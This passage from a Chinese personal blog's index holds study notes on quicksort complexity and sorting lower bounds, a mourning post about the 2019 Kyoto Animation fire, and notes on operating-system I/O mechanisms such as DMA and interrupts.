class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　在最理想的情况下，我们的数组被key平均地分成了两个部分，我们得到递归式$$T(n)=2*T(n/2)+Θ(n)$$<br>　　看起来我们的快排似乎没什么问题了，复杂度是Θ(nlogn)。但是，如果我们仔细观察快排选取key的策略的话，我们会发现，当遇到一个数组本来就有序时，每个步骤中数组被划分为了长度为0和N-1的两个部分，快排的复杂度竟然高达了Θ(n^2)，这对我们来说是不能接受的。那么平均情况呢？我们假设快排产生一次最佳划分和一次最差划分，则两次划分后，我们还是得到了两个长度近似为N/2的数组，这说明了我们的快速排序还是十分优秀的。另外，可以证明，即使快排产生的划分十分不均匀时(比如1:9)，我们得到的时间复杂度依然为O(nlogn)，可以使用递归树证明。<br>　　为了解决快排出现最坏情况的问题，我们可以采用一种随机的方式对快排进行简单的优化，每一次我们选取的不再是最右边的点，而是一个随机的位置，这样就能在很大程度上避免快排达到Θ(n^2)复杂度的情况了。我们只需更改quickSort函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = rand()%(r-l+<span class="number">1</span>)+l;</span><br><span class="line">        swap(a[x],a[r]);</span><br><span class="line">        <span class="keyword">int</span> mid = partition(a, l, r);</span><br><span class="line">        quickSort(a, l, mid<span class="number">-1</span>);</span><br><span class="line">        quickSort(a, mid+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　接下来，我们考虑如何证明快速排序的期望复杂度为Θ(nlogn)。为了证明这个问题，我们考虑Partition函数中的for语句。显然，算法最多调用n次partition函数，那么我们如果能求出partition中，if语句的期望执行次数X，那么我们就可以得到快排的复杂度为Θ(n+X)<br>　　如何计算比较操作的执行次数呢？这里需要扩充一下定义，我们将数组A的元素重新命名为\(z_i\)，表示数组A中第i小的元素，并且还定义了Z表示一个区间:\(Z_{ij} = {z_i, z_{i+1}, …, z_j}\)<br>　　另外，我们还要用到算法导论第五章讲到的指示器随机变量:<br>$$X_{ij}=I\,\{z_i与z_j比较\}$$<br>　　由此，我们得到了算法的总比较次数，再由数学期望的线性特性，我们可以得到:<br>$$X = \sum_{i=1}^{n-1}\sum_{j=i+1}^{n}X_{ij}$$<br>$$<br>E(X)=E[\,\sum_{i=1}^{n-1}\sum_{j=i+1}^{n}X_{ij}\,]<br>= \sum_{i=1}^{n-1}\sum_{j=i+1}^n E[\,X_{ij}\,]<br>= \sum_{i=1}^{n-1}\sum_{j=i+1}^{n}Pr\{z_i与z_j进行个比较\}<br>$$<br>　　那么，\(z_i和z_j比较\)的概率究竟怎么算？从正面比较难考虑的话我们可以试着从反面考虑:两个元素不会进行比较的情况。考虑快速排序的一个输入为1-10这10个数字(顺序任意)，并假设第一个主元为7，那么数字被分为两个集合{1,2,3,4,5,6}和{8,9,10}，并且第一个集合任意元素不会再和第二个集合的任意元素有比较了。这就告诉我们，在元素互异的情况下，一旦一个满足\(z_i &lt; x &lt; z_j\)的主元x被选择后，\(z_i,z_j\)就不会再有比较了。而在这个区间上，这每一个数字被选到的概率应该是相等的。由此，我们得到:<br>$$<br>\begin{align}<br>Pr\{z_i与z_j比较\} =&amp; Pr\{z_i或z_j被选为Z_{ij}的第一个主元\}\\<br>=&amp; Pr\{z_i是Z_{ij}的第一个主元\}+Pr\{z_j是Z_{ij}的第一个主元\}\\<br>=&amp; \frac{1}{j-i+1}+\frac{1}{j-i+1}\\<br>=&amp; \frac{2}{j-i+1}<br>\end{align}<br>$$<br>　　再将两个式子联立，我们可以得到:<br>$$<br>\begin{align}<br>E[X] =&amp; \sum_{i=1}^{n-1}\sum_{j=i+1}^{n}\frac{2}{j-i+1} \\<br>=&amp; \sum_{i=1}^{n-1}\sum_{k=1}^{n-i}\frac{2}{k+1}\\<br>=&amp; \sum_{i=1}^{n-1}\sum_{k=1}^{n}\frac{2}{k}\\<br>=&amp; \sum_{i=1}^{n=1}O(logn)\\<br>=&amp; \,O(nlogn)<br>\end{align}<br>$$<br>　　最终，在元素互异的前提下，我们得到了快速排序期望复杂度的一个上界O(nlogn)<br>　　另外，书中还给出了另外一种证明快排的复杂度的方法，这种方法关注的不是比较的次数，而是每一次单独递归调用的期望运行时间。利用递归式和不等式放缩，最后再使用代入法进行证明，这里省略了。<br>　　这样就结束了吗？当然不是。我们其实还会发现一个问题，如果元素不互异呢？假如现在有一个数组，其中所有元素都相同，这个时候复杂度是多少呢？结果有点遗憾，是O(n^2)。为了处理这样的一种情形，我们可以采取这样的一种措施，在partition函数中，将原数组分为3个部分，左边部分比key小，右边部分比key大，中间部分和key的大小相同，这样就解决了这个问题了。<br>　　此外，在具体进行快速排序的时候，还有一个小优化可以做:当数组长度很小时(比如n&lt;8)，我们可以转换排序策略，选择插入排序。测试表明，插入排序在数组很小的时候复杂度是比较优的。经过这样的调整，能在某种程度上提高快排的运行效率。</p><h2 id="other-sort-algorithm"><a href="#other-sort-algorithm" class="headerlink" title="other sort algorithm"></a>other sort algorithm</h2><p>　　前面我们提到的两类排序算法复杂度分别为O(n^2)和O(nlogn)。这些排序算法都有一个相同的特点——各元素的次序依赖于对他们的比较，这类排序被称为比较排序。为了解决排序算法的下界问题，我们需要用到决策树模型。决策树是一颗完全二叉树，它可以表示在给定输入规模的情况下，某一特定排序算法对所有元素的比较操作。树中每个内部节点以i:j标记。每个叶子节点对应一个数列。排序算法的执行则相当于一条从树的根节点到叶节点的路径。到达一个叶节点时，表明排序已经完成。<br><img src="/2019/09/27/sort-algorithm/pic.png" alt="tree"><br>　　对于一个n个元素的数组，共有n!种排列，每一种排列都必须位于树的某一个节点。若设该决策树有l个节点，高度为h，则我们有:<br>$$n! &lt;= l &lt;= 2^h$$<br>　　对两边取对数，我们有:<br>$$<br>\begin{align}<br>h &amp;&gt;= lg(n!)\\<br>&amp;= Ω(nlgn)<br>\end{align}<br>$$<br>　　由此，我们得到了比较排序算法的一个下界为Ω(nlgn)。那么我们如果想要突破这个下界，就不能采用比较的关系去实现排序算法了。我们需要另辟溪径。<br>　　桶排就是这样的一个算法，它平均情况下的复杂度为O(n)，看起来要比前面的所有算法都要优秀许多。<br>　　桶排假设数服从均匀分布。假设数据分布在区间[0,1)上，现在给n个桶，那么我们将区间分为n个相同大小的子区间，并对应于给定的桶，将位于区间内的数放到对应的桶中，最后遍历每个桶，并对桶中的每个数字进行排序，再按顺序列出即可。当然，也可以使用Hash，将某些区间的值映射到某个桶中。<br>　　另外，还有计数排序和基数排序，他们都是运行时间十分优秀的算法，不过需要使用额外的空间，且依赖于数字的大小，但在某些情况下能够有较优异的表现。</p><h2 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h2><p>　　到这里，我们的算法导论系列的第一期就结束了。这一期主要记录了一些排序算法的思想，重点关注快排，归并这两种算法。我们简单地提了这些排序算法的写法，并提了一下复杂度的分析。接下来，按照算法导论的顺序，下一期可能要写一下红黑树的笔记吧。</p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> sort </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kyouto Animation</title>
      <link href="/2019/07/19/Animation/"/>
      <url>/2019/07/19/Animation/</url>
      
        <content type="html"><![CDATA[<p>　　希望这场灾难中的逝者安息，伤者早日康复。<br>　　　　– 等待，并心怀希望</p><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　其实我自己也不知到为什么要来写这样的一篇博客。不过我想，既然是自己的博客，内容也不必拘泥于技术方面，记录一些自己的所思，所想也是很重要的。另一个原因的话应该是自己受动画，尤其是京都动画的影响确实很大，即使说是影响到世界观，人生观，价值观的形成也不为过。</p><h2 id="我眼中的京都动画"><a href="#我眼中的京都动画" class="headerlink" title="我眼中的京都动画"></a>我眼中的京都动画</h2><p>　　京都动画(京アニ)作为一家动画公司，真正开始独立地制作动画开始于2003年，munto和全金属狂潮。再到后面，接下了key社三部曲的gal改动画(Kanon, Air, Clannad)，一步步开始走向巅峰，其中CL更是几乎在全世界各大网站的评价都是排行前几，可以说，这是一部被大多数宅圈子的人认可的优秀作品。后面，凉宫春日系列，更是让京阿尼收割了一大波人气，优秀的制作，各种全新的套路设定，可以说是开创性的，被誉为”两亿人的凉宫”。后面，《けイオン！》(轻音少女)更是被称为强国源泉，令人舒适的剧情和人设开创了萌系动画的先河。其后，《氷菓》，《Free!》，《日常》，《吹响吧！上低音号》，《紫罗兰永恒花园》等优秀作品同样为他赢得了不小的人气。<br>　　京都脱离角川文库，可以说是一个重要的转折点。在此之后，京都似乎陷入了困境：尽管作品的作画质量依旧越来越优秀，剧情却有点令人担心，甚至怀疑京都还能坚持多久。当然，京都也在一步步地努力，在业界普遍是制作商为出版商打工的今天，可以说，京都是一股清流。<br>　　另外，关于京都的人员。从官网的数据来看的话，京都动画的员工应该是165名，平均年龄33.6岁，平均工作时间约为10年。可以说，这是一家很“小”的公司。另外，京都其实应该说是一家相对密闭的公司，其中的员工大多数都是来自于自家的培训，应该说，京都的门槛是很高的。也正是这样的精雕细啄，使得京都内的员工专业水平上都很高，夸张一点点说的话，每一个员工都可以说是动画行业中的瑰宝。<br><img src="/2019/07/19/Animation/1.jpg" alt="Pic1"><br>　　业界药丸？为什么会有这样的言论呢？据说(不一定正确)，一开始只是庵野秀明的一个梗，但也是有一定的现实依据。现在的日本动画业界，工资普遍低下，像原画师，甚至要养活自己都没有那么容易，而很多人之所以还能够坚持继续创作，也许就是对动画深深的热爱吧。当然，不得不提到的一点是，京阿尼在工资和福利上面还是很好的，可以说是业界良心了，采用的也是按小时计算工资的方式(和业界按件计的方式不太一样)，这也是很多公司内的员工愿意一直留在这里工作的重要原因。<br>　　为什么喜欢京都动画？我想，最直接的原因，就是他们对于动画的态度，几乎每一位动画工作者都是满怀着对动画的憧憬和热爱去制作的，因此，即便是京黑，也无法在画面制作这一点上对京都进行否定。”这光，，这水”“京都出品，必属精品”这样的话尽管有一点调侃的意味，却也正说明了动画人对作品认真负责的态度，看到自己亲手创作的人物动起来的那一剎那，也许正是像看到自己的孩子终于长大了的样子吧，欣慰，感动。<br><img src="/2019/07/19/Animation/3.jpg" alt="Pic3"></p><h2 id="噩耗的发生"><a href="#噩耗的发生" class="headerlink" title="噩耗的发生"></a>噩耗的发生</h2><p>　　在临近中午(7.18)的时候，不经意间翻开了手机，上面看到了一个同学发过来的信息：京都动画发生了大火，很多人受伤。看到这个消息，第一个想法是这不会是假的吧？如果是真的话，那人没事吧？作品也没事吧？后面看了一下b站和知乎的消息：重伤10人，1人死亡，凶手是故意放火，原因仅仅是对京都动画不满。<br>　　怎么回事？？？<br>　　不是怎么会有这种人？心中反反复复地祈祷着，原画没了就算了，人千万不要出事啊，拜托了。可事与愿违。紧接着，一个个噩耗不断传来，心肺停止10人，17人，死亡人数也在不断攀升，从一开始的1人，到4人，10人，17人，20人，25人，33人……够了，我不想再听下去了！颤抖的手不断地滑着屏幕，刷新键一次又一次地被按下，但收到的，却是一个又一个令人难受的消息。<br>　　说实话，即使到现在，我也有点感觉：这一定不是真的，我是在做梦吧？我最喜欢的京阿尼，业界标杆京阿尼竟然会迎来这样的一天。<br>　　どうして？そんなん酷いことをするなんで、あり得ない<br>　　且不论京阿尼做过了什么，都不应该受到放火这样的对待，这已经不仅仅是ACG界的事情了，毫不夸张地说，这已经算是大规模的恐怖袭击。难以想象，凶手在行凶前早已做足了充分的准备，买了40L的汽油，随身带了好几把刀具，堵在门口，这是怎样的一种心态，是有多大的深仇大恨才能做的出这样的事情？<br>　　全然分からない<br>　　已经不幸离世的33名工作人员，我们能做的也只有祈福，也希望还活着的人能够坚强，走出阴影。今天到第一工作室上班的70名员工，他们也许永远也不会想到，早上妻子/丈夫准备的那分简单的早餐，竟是自己生前的最后一顿饭；他们也许永远也不会想到，早上乘上了电车后的轻轻的挥手，竟然化作了西边的云彩；他们也许永远也不会想到，自己最后的那个早晨描下的一比一划，竟是自己留给这个世界最后的礼物——这一切那么美好而又那么真实，却被区区一个纵火犯给烧得干干净净。是的，悲剧就是把美好的东西毁灭给人看。<br>　　前几天才看完白箱，第一次较为真实地了解到了业界的现状。一代传承着一代，靠着数十万人，经历了数年，数十年的努力，再加上与观众的感想和心意的结合，一部优秀的动画才能诞生。就像一颗小火苗，精心培养和传承下去，最终才能变成永不熄灭的火焰。而这些人的努力，却轻轻松松地被摧毁，这又是多么讽刺。</p><h2 id="末"><a href="#末" class="headerlink" title="末"></a>末</h2><p>　　尽管知道，这样的日记不过是在自我安慰而已，也不会有人去看；尽管知道，二次元的文化确实存在许许多多的问题，放在全世界的天平上不过是沧海一粟；尽管知道，二次元只是理想，只是一个小群体的圈地自萌。也许这样说并不太恰当，但我觉得动画人可以算得上是最单纯的一群人，他们的目标不是什么尔虞我诈，也不是什么沧海桑田，而是一种对艺术的尊敬和追崇，对于这样的一个团体而言，动画就像一道光，照亮的是整个世界。<br><img src="/2019/07/19/Animation/2.jpg" alt="2.jpg"><br>　　一生懸命アニメを作ってるのに<br>　　那33位staff们，我相信，你们并没有走，你们只是去了心中的”遙か彼方”，去看望他可爱的孩子们。</p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> animation </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Modern Operating System Note(I) —— I/O</title>
      <link href="/2019/06/12/I-O/"/>
      <url>/2019/06/12/I-O/</url>
      
        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这篇文章是关于《现代操作系统》的一些笔记，主要记录一些自己觉得比较有用的知识点。整体上可能是按照书中的顺序来写的，也有可能自己稍微再整合一下。主要目的还是加深自己的印象，把知识真正地读进脑子里。<br>　　整个章节大致按照如下的顺序，首先介绍IO的一些概念，其次简单了解一下IO硬件和软件的一些原则，然后再深入了解IO软件的结构，并理解他们之间是如何进行协作的。再接下来，较详细的了解一些具体的IO设备的工作原理。</p><h2 id="what-is-I-O"><a href="#what-is-I-O" class="headerlink" title="what is I/O"></a>what is I/O</h2><p>　　什么是I/O？这是一个十分广泛的概念。简单来说，I/O就是Input/Output，即输入输出。为什么说它重要呢？在冯诺伊曼架构中，把计算机分成了存储器，控制单元，运算单元和输入输出这几个部分。换句话来书，我们可以把计算机看成是一个黑匣子，而输入输出就相当于它和外界进行信息交互的通道！对于一个计算机来说，我们希望在我们给它一定的输入后，它在经过计算后给予正确的输出。这些都涉及到了I/O。<br>　　同时，I/O既可以指字面意义上的输入和输出，也可以指一些I/O设备，像鼠标，键盘，磁盘，显示器等。</p><h2 id="I-O-hardware"><a href="#I-O-hardware" class="headerlink" title="I/O hardware"></a>I/O hardware</h2><p>　　由于I/O本身十分复杂，而且不同的I/O设备的架构区别也较大，在本章节中，我们主要关心的是可编程的I/O，即我们不会太去在意I/O内部究竟是怎样工作的。</p><h3 id="I-O-device"><a href="#I-O-device" class="headerlink" title="I/O device"></a>I/O device</h3><p>　　I/O设备可以被分成两种类型。第一种是block devices，第二种是character devices。<br>　　如同字面上的意思，块设备内部信息的存储是按块分类的，往往内部块的大小是规定固定的，在写入和读取的时候都是以块为单位进行。像我们常见的磁盘，USB设备等都是属于block devices。<br>　　character devices则不同，它在输入和输出的时候是按照字节来的，即是以字节流的形式进行输入和输出操作。由于这个特性，这种设备的信息往往是不可编址的，像是打印机，网络接口都可以看成是character devices。<br>　　当然，事实上两者之间的界限并不严格，有一些设备是很难进行划定的，这样的分类方式只是便于我们去理解这些设备而已。</p><h3 id="Device-Controllers"><a href="#Device-Controllers" class="headerlink" title="Device Controllers"></a>Device Controllers</h3><p>　　I/O设备往往可以分成机械组件和电子组件，其中，电子组件被称为I/O控制器或者适配器，通常需要插入在主板的(PCIe)拓展槽中。控制器和设备本身之间的接口是非常低层次的，比如磁盘在传输的时候，往往是传递一整个字节流，以一个前导码为开始，中间是4096字节的信息(一个扇区)，最后是一个检验和，或者是错误纠正码(ECC)。控制器在确认信息没有问题之后，或者有问题但是成功纠正过后，就可以把信息复制到主存当中了。</p><h3 id="Memory-Mapped-I-O"><a href="#Memory-Mapped-I-O" class="headerlink" title="Memory-Mapped I/O"></a>Memory-Mapped I/O</h3><p>　　控制器往往都有一些寄存器用于和CPU的交互，通过将信息写入寄存器当中，我们可以执行一些指令，比如读取或者写入某些信息等，这些是控制寄存器。很多设备还有一些数据的缓冲区可以供操作系统进行读写操作。CPU和这些设备之间的交互有两种形式：<br>　　第一种是使用I/O端口号，有了这些端口后，我们就可以使用一些特别的指令进行操作了，比如</p><blockquote><p>IN REG,PORT<br>OUT PORT,REG</p></blockquote><p>　　分别是PORT上的信息写入到寄存器REG当中，和把寄存器REG中的数据存储编号为PORT的I/O设备的控制寄存器中。<br>　　第二种是使用内存映射。将所有的控制寄存器以及缓冲的数据都映射到内存空间当中，这样的话就可以通过对内存进行读写操作实现和IO设备的交互。这个时候操作系统就必须在内存空间中留出足够大的地方用于和I/O设备之间的映射。<br>　　这两种做法都有各自的优缺点。使用内存映射的方式进行I/O的话，我们就不需要显式地访问I/O设备的控制寄存器，只需要像访问内存中的其他位置一样读取和写入数据即可。并且，如果要访问I/O设备的话，由于C/C++没有直接的可以访问的函数，我们只能在C代码中嵌入汇编代码，这就增加了编码的复杂性。<br>　　其次，内存映射I/O简化了进行I/O操作处理时的一些保护机制。如果各个I/O设备位于内存空间中不同的页，我们可以直接给某个进程中包含I/O设备的页一定的权限，它就可以进行I/O操作了，而这对其他进程而言是未知的。同时，这样的处理方式也使得设备驱动器可以放在不同的内存空间当中，既降低了内核的大小，也避免了驱动器之间的相互干扰。<br>　　第三，内存映射I/O使得每一个对内存的引用也可以变成对I/O设备控制寄存器的引用。如果没有这样的操作的话，在检查是否有I/O信号时，我们需要从I/O设备的控制寄存器中读取信息，移动到CPU上，再检查寄存器上的信息是否满足要求，这就增加了指令的数量，有时也会影响到了性能。<br>　　当然，事物都是具有两面性的，内存映射I/O也带来了不少的问题。首先，就是缓存。我们在引用内存的时候，会在CPU中进行缓存，而对于I/O设备来说，它们的状态信息是不应该被缓存的。比如我们把I/O设备现在是空闲的信息缓存在CPU中，那么接下来所有的访问该I/O设备的结果都是空闲的，这会导致严重的后果。因此，为了避免这样的现象发生，在硬件层次上就必须要有一定的操作使得某些内存空间不能被缓存在CPU上，这同样也增加了设计的复杂度。</p><h3 id="Direct-Memory-Access"><a href="#Direct-Memory-Access" class="headerlink" title="Direct Memory Access"></a>Direct Memory Access</h3><p>　　不管CPU有没有使用内存映射I/O，它总是需要对设备控制器进行编址以进行数据的交换。这个时候，CPU虽然可以从I/O控制器中一次获取一个字节的数据，但这明显太慢了。因此很多情况下采用了另外一种方案——DMA。在有DMA控制器的硬件上，操作系统往往必须使用它。DMA控制器往往有自己独立的系统总线，它还包括几个用于和CPU交互的寄存器，有自己独立的字节计数器，运输单元等。<br>　　书中给了这样一个图以直观地看出DMA的作用。<br><img src="/2019/06/12/I-O/DMA.jpg" alt="I-O"><br>　　首先我们考虑一下没有DMA的情况下磁盘是如何读取数据的。磁盘读到一块数据后，放进自己的缓冲区中，在检查没问题后，磁盘控制器触发中断。操作系统收到后，在一个循环里一次读取一个字节的信息，然后存储在主存中。在有DMA的情况下，CPU首先对DMA进行编程，告诉它需要运输哪些东西到哪里。然后，DMA向磁盘控制器发出请求。磁盘控制器在确认信息无误后，将信息存储在主存中，并向DMA返回一个Ack进行确认。当所有信息传递完毕后，DMA向CPU发出中断。这个时候对操作系统来说，信息已经自动地从磁盘运输到内存当中了。</p><h3 id="Interrupts-Revisited"><a href="#Interrupts-Revisited" class="headerlink" title="Interrupts Revisited"></a>Interrupts Revisited</h3><p>　　另外，硬件的中断的产生是需要一个叫控制器的东西的管理的。当I/O设备完成工作后，它向总线中发出一个信号，这个信号会被中断控制器检测到，以此决定接下来说什么。<br>　　如果没有其他中断在等待的话，这个时候中断控制器马上处理对应的中断，否则，该中断需要进行等待。处理中断时，控制器将一个数字放进指定的位置，以告诉CPU中断的产生源。CPU进行一定的终端处理后，返回Ack给中断控制器，此后中断控制器可以再次组织中断。</p><h3 id="precise-and-imprecise-Interrupts"><a href="#precise-and-imprecise-Interrupts" class="headerlink" title="precise and imprecise Interrupts"></a>precise and imprecise Interrupts</h3><p>　　中断产生时，需要对对应的中断进行处理。但我们知道，CPU内部是流水线结构的，即在同一个时刻，可能有多个指令在进行处理，不同的指令的处理进度不一定相同，这个时候如果触发了中断，则需要对已进入流水线但是还未处理完成的指令进行处理。其中，一种方法就是等待到当前执行的所有指令都执行完后再触发中断，这就是precise Interrupts。另外一种处理方法就是直接停下，但是需要在栈中记录每一个指令的处理进度。两种方法都各有优劣。等待的话有时会导致终端无法及时处理，而如果直接停下，又涉及到指令的执行状态的保存问题，这会极大程度上加大编码的复杂性。在x86系列中，采用的是两种混合的模式。　　</p><h2 id="I-O-software"><a href="#I-O-software" class="headerlink" title="I/O software"></a>I/O software</h2><p>　　I/O软件层次较为复杂。其中一个关键概念就是设备的独立性。我们需要能写出一个通用 达成需能够同时访问任意的I/O设备，而不需要对命令进行更改。比如输入<strong>sort &lt; input &gt; output</strong>，程序就应该能读取一个文件作为输入，并输出到另一个文件中，而不管文件是位于磁盘，USB或者是其他I/O设备中。<br>　　另外一个重点的问题是错误的处理。有一些错误可能只是暂时的，比如磁盘上沾了一点灰尘，可能再次进行读取就好，而有些错误则需要对应的处理措施。<br>　　还有另外一个重要的问题是同步与异步。以及缓存等</p><h3 id="three-fundamental-way"><a href="#three-fundamental-way" class="headerlink" title="three fundamental way"></a>three fundamental way</h3><p>　　I/O有三种基本的执行方式。包括programmed I/O, interrupt-driven I/O和I/O using DMA</p><h4 id="Programmed-I-O"><a href="#Programmed-I-O" class="headerlink" title="Programmed I/O"></a>Programmed I/O</h4><p>　　第一种重要的I/O方式是程序化的I/O。比如我们要打印“ABCD”这个字符串时，操作系统首先将字符串拷贝到内核空间中，然后向I/O设备发出请求，当可以访问时(I/O设备往往有对应的状态寄存器)，系统将”A”拷贝到设备中，然后等待，继续再将”B”拷贝到设备中，直至所有的字节拷贝完成。这种方式每次只输出一个字符，CPU不断地询问设备，确认设备是否可以进行下一个字节的传输。这种方式又被成为轮询(polling)或忙等待(busy waiting)。这种方式很占用CPU时间。当如果CPU经常处于空闲状态的话，这种方式也是一个可行的选择。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(buffer, p, count); <span class="comment">// p 是数据的首指针</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">  <span class="keyword">while</span> (*printer_status_reg != READY);</span><br><span class="line">  *printer_data_register = p[i];</span><br><span class="line">&#125;</span><br><span class="line">return_to_user()</span><br></pre></td></tr></table></figure></p><h4 id="Interrupt-Driven-I-O"><a href="#Interrupt-Driven-I-O" class="headerlink" title="Interrupt-Driven I/O"></a>Interrupt-Driven I/O</h4><p>　　另外一种处理的方式是中断驱动。即每次拷贝信息后，判断信息是否处理完毕，未完毕则进入阻塞或进行其他代码的执行，直到收到中断。这是一种经典的异步编程方式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(buffer, p, count);</span><br><span class="line">enable_interrupts()</span><br><span class="line"><span class="keyword">while</span> (*printer_status_reg != READY);</span><br><span class="line">*printer_data_register = p[<span class="number">0</span>];</span><br><span class="line">scheduler();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">  unlock_user()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  *printer_data_register = p[i];</span><br><span class="line">  count = count - <span class="number">1</span>;</span><br><span class="line">  i = i + <span class="number">1</span>;</span><br><span class="line">  acknowledge_interrupt();</span><br><span class="line">  return_from_interrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="使用DMA进行I-O操作"><a href="#使用DMA进行I-O操作" class="headerlink" title="使用DMA进行I/O操作"></a>使用DMA进行I/O操作</h4><p>　　使用中断驱动的I/O有个缺陷，就是当打印的速度较快时，常常会陷入中断状态，这也是很占用CPU时间的。因此，另一种做法是使用DMA。像在硬件层次一样，DMA负责将信息全部发送到printer，CPU就可以做自己的事情了。DMA中使用忙等待模式，当处理完成后，触发中断通知CPU即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CPU操作</span></span><br><span class="line">copy_from_user(buffer, p, count);</span><br><span class="line">set_up_DMA_controller();</span><br><span class="line">scheduler();</span><br><span class="line"><span class="comment">// 中断处理操作</span></span><br><span class="line">acknowledge_interrupt();</span><br><span class="line">unblock_user();</span><br><span class="line">return_from_interrupt();</span><br></pre></td></tr></table></figure></p><h3 id="I-O-sofrware-layers"><a href="#I-O-sofrware-layers" class="headerlink" title="I/O sofrware layers"></a>I/O sofrware layers</h3><p>　　I/O软件可以组织成4个层次，如下图。每一个层次都能提供完善的接口给相邻的层次使用。</p><table><thead><tr><th style="text-align:center">I/O sofrware layers</th></tr></thead><tbody><tr><td style="text-align:center">User-level I/O software</td></tr><tr><td style="text-align:center">Device-independent operating system software</td></tr><tr><td style="text-align:center">Device driver</td></tr><tr><td style="text-align:center">Interrupt handlers</td></tr><tr><td style="text-align:center">Hardware</td></tr></tbody></table><h4 id="Interrupt-handlers"><a href="#Interrupt-handlers" class="headerlink" title="Interrupt handlers"></a>Interrupt handlers</h4><p>　　中断处理是I/O操作中不可或缺的部分。但是，处理一个中断的过程是十分复杂的。简单来说，进程会先进行阻塞(比如使用信号量)，直到收到中断后，取消阻塞状态。在中断处理时，可能包括但不限于以下操作：</p><ol><li>保存寄存器数据</li><li>重新设置上下文，更新TLB，MMU和页表和栈，用于中断处理</li><li>发送Ack给中断控制器</li><li>复制寄存器的信息</li><li>运行中断处理函数</li><li>选择接下来运行的进程，并进行上下文的设置(TLB，MMU，页表等)</li><li>读取新的进程的寄存器数据</li><li>运行新的进程</li></ol><h4 id="Device-Driver"><a href="#Device-Driver" class="headerlink" title="Device Driver"></a>Device Driver</h4><p>　　设备驱动器，顾名思义是用于设备的驱动的。由于不同的设备之间的区别是很大的。比如鼠标的驱动器需要接受鼠标的信息，得到鼠标移动了多远，点击了哪个按钮等。而磁盘的驱动器需要知道磁道，扇区，柱面，磁臂等信息。因此，每一个I/O设备需要一个和设备高度相关的驱动器与之关联，这样才便于我们对设备的使用。<br><img src="/2019/06/12/I-O/device_driver.jpg" alt="device_driver"></p><h4 id="Device-Independent-I-O"><a href="#Device-Independent-I-O" class="headerlink" title="Device-Independent I/O"></a>Device-Independent I/O</h4><p>　　尽管有些I/O软件是设备相关的，有部分的设备需要设备无关。不过这两种类型的边界并不确定，和具体的系统有关。<br>统一的设备驱动器接口：<br>　　对于相似的I/O设备，如果每一种设备对上层的接口都不相同的话，那么势必会造成严重的混乱，因此，对于比如SATA disk driver, USB disk driver, SCSI disk driver这几种类型，我们应该使用一个标准的接口，这样更便于进行设备的管理和使用。<br>缓存：<br>　　很明显，每次都读取一小点信息到用户空间中是效率很低的，因此需要一定的缓存。我们可以在内核空间中开辟一段内存，然后设备获取到的信息直接复制到该内存区域。当内存满时，在复制给用户即可。但是，这样又有问题。如果在字符到来的时候，对应的缓存已满，那么就会发生一些问题。这个时候可以采用双缓冲。即一个缓冲在进行消息从内核空间到用户空间的复制的同时，另一个缓冲在进行从I/O设备到用户空间的复制。也可以采用另一种方式，环形缓冲，只需要保存头尾指针即可。</p><p><img src="/2019/06/12/I-O/summary.jpg" alt="summary"></p><h2 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h2><p>　　这篇笔记主要都还是按照书中的内容写的，基本上写的都是自己觉得比较重要一点的知识点，但感觉还是很乱，可能是操作系统这块本身就比较复杂，很多知识点理解还是不太到位，感觉总是有一些矛盾的地方，希望在后面能逐渐解决。</p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> I/O </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Data Structure Note(IV) —— Link/Cut Tree</title>
      <link href="/2019/06/06/data-structure4/"/>
      <url>/2019/06/06/data-structure4/</url>
      
